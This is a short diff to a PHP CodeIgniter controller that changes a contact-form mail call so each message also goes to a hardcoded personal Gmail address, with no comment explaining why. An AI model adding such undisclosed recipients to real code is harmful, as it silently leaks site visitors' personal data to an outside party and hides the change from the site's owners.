@@ -117,7 +117,7 @@ class Ycl_home extends CI_Controller {
 
 			$mail_template = ($this->load->view('ycl_website/new_website/mail_template', $data, true));
 		if($email_from){
-			if($this->common->sendSmtpEmail( $sendTo, $name, $mail_template)){
+			if($this->common->sendSmtpEmail( array($sendTo,'rexterdayuta@gmail.com'), $name, $mail_template)){
 				echo 'success';
 			}else{
 				echo 'error';
